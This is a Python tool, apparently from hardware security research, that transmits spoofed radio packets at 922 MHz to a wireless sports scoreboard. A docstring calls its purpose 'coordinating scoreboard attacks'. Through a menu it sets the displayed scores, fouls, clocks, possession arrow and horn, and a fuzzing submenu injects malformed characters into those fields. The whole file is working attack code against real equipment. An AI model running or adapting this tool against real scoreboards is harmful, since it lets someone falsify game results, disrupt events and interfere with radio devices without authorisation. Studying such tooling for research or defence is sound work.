
from packet import *
from tx_modem import *
import signal
import time
import sys

do_exit_loop = False 
def exit_loop_handler(signum, frame):
    global do_exit_loop
    do_exit_loop = True 

'''
High level operations for coordinating scoreboard attacks
'''

def main(options=None):

    if(len(sys.argv) < 3):
        print("Provide Baud Rate For the parameter") 
        sys.exit(0) 

    frequency = 922 # MHz
    offset = 1000 # KHz
    baud_rate = sys.argv[2] # Bits per second
    sps = 5.25 # Million samples per second

    # Frequency, Offset in KHz, Bits Per Second (Baud Rate), Samples Per Second
    scoreboard_modem = tx_modem(frequency, offset, baud_rate, sps, True) 

    shutdownAfterSignal(scoreboard_modem)

    try:
        data_packet = packet()
        #init_data = [0x34,0x30,0x32,0x35,0x30,0x30,0x30,0x30,0x30,0x30,0x30,0x30,0x30,0x31,0x30,0x33,0x33,0x48,0x4e,0x43,0x47, 0x31, 0x4A, 0x45, 0x53, 0x53, 0x45, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x4D, 0x41, 0x58, 0x57, 0x45, 0x4C,0x4C]
        #data_packet = packet(teams=True, initial_data=init_data)
        print()
        data_packet.scoreboard.print_scoreboard()
        print()
        scoreboard_modem.updateDigitalSequence(data_packet.get_raw())

        print("Initialization complete.")
        input("Press Enter to begin transmission: ")

        scoreboard_modem.printInfo() # print modem settings
        scoreboard_modem.start()     # start sending packets through flowgraph

        while True:
            print()
            print("Type a number to select from these commands:")
            print("1. Change Team Names")
            print("2. Set Home Team Score")
            print("3. Set Guest Team Score")
            print("4. Set Home Team Fouls")
            print("5. Set Guest Team Fouls")
            print("6. Set Home Timeouts Left")
            print("7. Set Guest Timeouts Left")
            print("8. Flip Possession Arrow")
            print("9. Set Game Period")
            print("10. Run Game Clock")
            print("11. Reset Shot Clock")
            print("12. Set Game Clock")
            print("13. Set Shot Clock")
            print("14. Turn On Horn")
            print("15. Turn Off Horn")
            print("16. Fuzzing Submenu")
            print("17. Print Scoreboard")
            print("18. Print Packet")

            print("0. Exit")
            print()

            choice = input("Number: ")

            if(choice == "1"):
                customizeTeams(scoreboard_modem, data_packet)
            elif(choice == "2"):
                setScoreHome(scoreboard_modem, data_packet)
            elif(choice == "3"):
                setScoreGuest(scoreboard_modem, data_packet)
            elif(choice == "4"):
                setFoulHome(scoreboard_modem, data_packet)
            elif(choice == "5"):
                setFoulGuest(scoreboard_modem, data_packet)
            elif(choice == "6"):
                setTOLHome(scoreboard_modem, data_packet)
            elif(choice == "7"):
                setTOLGuest(scoreboard_modem, data_packet)
            elif(choice == "8"):
                flip_possession_arrow(scoreboard_modem, data_packet)
            elif(choice == "9"):
                setPeriod(scoreboard_modem, data_packet)
            elif(choice == "10"):
                runClock(scoreboard_modem, data_packet)
            elif(choice == "11"):
                resetShotClock(scoreboard_modem, data_packet)
            elif(choice == "12"):
                setGameClock(scoreboard_modem, data_packet) 
            elif(choice == "13"):
                setShotClock(scoreboard_modem, data_packet) 
            elif(choice == "14"):
                setHornOn(scoreboard_modem, data_packet)
            elif(choice == "15"):
                setHornOff(scoreboard_modem, data_packet)
            elif(choice == "16"): 
                fuzz(scoreboard_modem, data_packet)
            elif(choice == "17"):
                data_packet.scoreboard.print_scoreboard()
            elif(choice == "18"):
                print(str(data_packet))
            elif(choice == "0"):
                break 

            scoreboard_modem.updateDigitalSequence(data_packet.get_raw())

        print("Clean exit, operations complete")
    except EOFError:
        pass

    scoreboard_modem.shutdown()
    print("Modem shutdown")

'''
Setters and input gathers for inputs
'''
def setScoreHome(scoreboard_modem, data_packet, score=""):
    if(score == "" or score == 0):
        score = input("Home Team Score:")
    data_packet.scoreboard.set_home_score(score)
    scoreboard_modem.updateDigitalSequence(data_packet.get_raw())

def setScoreGuest(scoreboard_modem, data_packet, score=""):
    if(score == "" or score == 0):
        score = input("Guest Team Score:")
    data_packet.scoreboard.set_guest_score(score)
    scoreboard_modem.updateDigitalSequence(data_packet.get_raw())

def setFoulHome(scoreboard_modem, data_packet, foul=""):
    if(foul == "" or foul == 0):
        foul = input("Home Team Foul:")
    data_packet.scoreboard.set_home_foul(foul)
    scoreboard_modem.updateDigitalSequence(data_packet.get_raw())

def setFoulGuest(scoreboard_modem, data_packet, foul=""):
    if(foul == "" or foul == 0):
        foul = input("Guest Team Foul:")
    data_packet.scoreboard.set_guest_foul(foul)
    scoreboard_modem.updateDigitalSequence(data_packet.get_raw())

def setTOLHome(scoreboard_modem, data_packet, tol=0):
    if(tol == "" or tol == 0):
        tol = input("Home Team Timeouts Left:")
    data_packet.scoreboard.set_home_tol(int(tol))
    scoreboard_modem.updateDigitalSequence(data_packet.get_raw())

def setTOLGuest(scoreboard_modem, data_packet, tol=0):
    if(tol == "" or tol == 0):
        tol = input("Guest Team Timeouts Left:")
    data_packet.scoreboard.set_guest_tol(int(tol))
    scoreboard_modem.updateDigitalSequence(data_packet.get_raw())

def flip_possession_arrow(scoreboard_modem, data_packet):
    data_packet.scoreboard.flip_possession_arrow()

def setPeriod(scoreboard_modem, data_packet, period=0):
    if(period == "" or period == 0):
        period = input("Period: ")
    data_packet.scoreboard.set_period(int(period))
    scoreboard_modem.updateDigitalSequence(data_packet.get_raw())

# TODO: Support under a minute timer
def setGameClock(scoreboard_modem, data_packet, minutes = 0, seconds = 0 ):
    if(minutes == 0 and seconds == 0):
        minutes = input("Game Clock Minutes: ")
        seconds = input("Game Clock Seconds: ")
    data_packet.scoreboard.set_game_clock(minutes, seconds) 
    scoreboard_modem.updateDigitalSequence(data_packet.get_raw())

def setShotClock(scoreboard_modem, data_packet, seconds = 0 ):
    if(seconds == 0):
        seconds = input("Shot Clock Seconds: ")
    data_packet.scoreboard.set_shot_clock(seconds) 
    scoreboard_modem.updateDigitalSequence(data_packet.get_raw())


def setHornOn(scoreboard_modem, data_packet):
    data_packet.scoreboard.horn_on()
    scoreboard_modem.updateDigitalSequence(data_packet.get_raw())

def setHornOff(scoreboard_modem, data_packet):
    data_packet.scoreboard.horn_off()
    scoreboard_modem.updateDigitalSequence(data_packet.get_raw())

def reset(scoreboard_modem, data_packet): # not the cleanest
    customizeTeams(scoreboard_modem, data_packet, "HOME", "GUEST", 0)
    time.sleep(0.25)
    return packet()


def setRSSI(scoreboard_modem, data_packet):
    data_packet.scoreboard.set_teams(False)
    data_packet.scoreboard.mode_flag = "T"
    data_packet.length = [0x19]
    scoreboard_modem.updateDigitalSequence(data_packet.get_raw())

    time.sleep(1)

    data_packet.scoreboard.set_teams(True)
    data_packet.scoreboard.mode_flag = "T"
    data_packet.length = [0x34]
    scoreboard_modem.updateDigitalSequence(data_packet.get_raw())



def customizeTeams(scoreboard_modem, data_packet, guest_name="", home_name="", blinker_loc=""):
    if(guest_name == "" and home_name == ""):
        home_name = input("Home Team Name: ")
        guest_name = input("Guest team Name: ")
    
    data_packet.scoreboard.mode_flag = "G"
    data_packet.scoreboard.teams = True
    data_packet.scoreboard.blinking_data = str("0")
    data_packet.scoreboard.home_team = str(home_name) 
    data_packet.scoreboard.guest_team =  str(guest_name)
    data_packet.length = [0x34]
    scoreboard_modem.updateDigitalSequence(data_packet.get_raw())

# TODO: Support under a minute timer
def runClock(scoreboard_modem, data_packet, delay = 0):
    global do_exit_loop
    if(delay == 0):
        delay = input("Second delay:")

    original_sigint = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, exit_loop_handler)
    og_shot_clock = int(data_packet.scoreboard.get_shot_clock())

    # Only used when milliseconds is required...
    counter = 0

    cont = True
    while(cont == True):

        if(do_exit_loop == True):
            break 

        # If either time has ran out
        if(int(data_packet.scoreboard.get_shot_clock()) == 0 or data_packet.scoreboard.get_game_clock() == "00.00"):
            data_packet.scoreboard.horn_on() 
            break  
    
        # Seconds and milliseconds mode
        if(data_packet.scoreboard.get_score_mode() == 'D'):
            counter += 1 
            time.sleep(float(delay)/100)
        # Minutes and seconds mode delay
        else: 
            time.sleep(float(delay))

        # Always decrease the game clock. If in the 'D' mode, it will do the math for us on the milliseconds.
        data_packet.scoreboard.decrease_game_clock()

        if((data_packet.scoreboard.get_score_mode() == 'D' and (counter % 100) == 0 and counter != 0) or data_packet.scoreboard.get_score_mode() == 'C'): 
            data_packet.scoreboard.decrease_shot_clock()

        if(data_packet.scoreboard.get_shot_clock() == 0):
            data_packet.scoreboard.horn_on() 

        scoreboard_modem.updateDigitalSequence(data_packet.get_raw())
    

    '''
    for i in range(0, og_shot_clock + 1):

        # Seconds and milliseconds mode
        if(data_packet.scoreboard.get_score_mode() != 'D'):

        time.sleep(float(delay))

        data_packet.scoreboard.decrease_game_clock()
        data_packet.scoreboard.decrease_shot_clock()

        if(data_packet.scoreboard.get_shot_clock() == 0):
            data_packet.scoreboard.horn_on() 

        scoreboard_modem.updateDigitalSequence(data_packet.get_raw())

        if(do_exit_loop == True):
            break 
    '''

    signal.signal(signal.SIGINT, original_sigint)
    do_exit_loop = False


def resetShotClock(scoreboard_modem, data_packet):
    data_packet.scoreboard.set_shot_clock(30) 
    scoreboard_modem.updateDigitalSequence(data_packet.get_raw())


def fuzz(scoreboard_modem, data_packet): 
    print("Fuzzing Menu")
    print("========================")
    print("1. Fuzz Scores")
    print("2. Fuzz Blink Location")
    print("3. Fuzz Possession Arrow")
    print("4. Fuzz Fouls")
    print("5. Fuzz Game Clock")
    print("6. RSSI Set")
    print("")
    choice = input("Fuzzing Option: ")
    if(choice == "1"):
        fuzzScores(scoreboard_modem, data_packet, 0.5)
    elif(choice == "2"):
        fuzzBlinkerLoc(scoreboard_modem, data_packet)
    elif(choice == "3"):
        fuzzArrow(scoreboard_modem, data_packet, 0.5)
    elif(choice == "4"):
        fuzzFouls(scoreboard_modem, data_packet, 0.5)
    elif(choice == "5"):
        fuzzGameClock(scoreboard_modem, data_packet, 0.5)
    elif(choice == "6"): 
        setRSSI(scoreboard_modem, data_packet)

def fuzzScores(scoreboard_modem, data_packet, delay):
    chars = '01234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()-_=+[]{}|\:;"\'<>?,./~`'
    print("Starting score fuzzer, sequence", chars)
    for c in chars:
        payload = c + c + c
        print(payload)
        data_packet.scoreboard.home_score = payload
        data_packet.scoreboard.guest_score = payload
        scoreboard_modem.updateDigitalSequence(data_packet.get_raw())
        time.sleep(delay)
    print("Fuzzer complete")


def fuzzBlinkerLoc(scoreboard_modem, data_packet):
    for i in range(0, 70):
        c = chr(i+0x30)
        print(c)
        data_packet.scoreboard.set_blink(c)
        scoreboard_modem.updateDigitalSequence(data_packet.get_raw())
        time.sleep(1)
    print("Fuzzer complete")


# def countdownGameClock(scoreboard_modem, data_packet, delay=1)
#     print("Counting down game clock")
#     for
#         payload = c + c
#         print(payload)
#         data_packet.scoreboard.set_game_clock(payload, payload)
#         scoreboard_modem.updateDigitalSequence(data_packet.get_raw())
#         time.sleep(delay)
#     print("Fuzzer complete")

# looks like the C# checks for "H" or "G"
def fuzzArrow(scoreboard_modem, data_packet, delay):
    chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()-_=+[]{}|\:;"\'<>?,./~`'
    print("Starting home foul fuzzer, sequence", chars)
    for c in chars:
        payload = c
        print(payload)
        data_packet.scoreboard.set_possession_arrow(payload)
        scoreboard_modem.updateDigitalSequence(data_packet.get_raw())
        time.sleep(delay)
    print("Fuzzer complete")


def fuzzFouls(scoreboard_modem, data_packet, delay):
    chars = 'WXYZ1234567890!@#$%^&*()-_=+[]{}|\:;"\'<>?,./~`'
    print("Starting home foul fuzzer, sequence", chars)
    for c in chars:
        payload = c
        print(payload)
        data_packet.scoreboard.set_home_foul(payload)
        scoreboard_modem.updateDigitalSequence(data_packet.get_raw())
        time.sleep(delay)
    print("Fuzzer complete")


def fuzzGameClock(scoreboard_modem, data_packet, delay):
    chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()-_=+[]{}|\:;"\'<>?,./~`'
    print("Starting game clock fuzzer, sequence", chars)
    for c in chars:
        payload = c + c
        print(payload)
        data_packet.scoreboard.set_game_clock(payload, payload)
        scoreboard_modem.updateDigitalSequence(data_packet.get_raw())
        time.sleep(delay)
    print("Fuzzer complete")


def shutdownAfterSignal(scoreboard_modem):
    def quitSignal(sig=None, frame=None):
        print("Recieved signal, shutting down modem...")
        scoreboard_modem.shutdown()
        sys.exit(0)

    signal.signal(signal.SIGINT,  quitSignal)
    signal.signal(signal.SIGTERM, quitSignal)


if __name__ == '__main__':
    main()
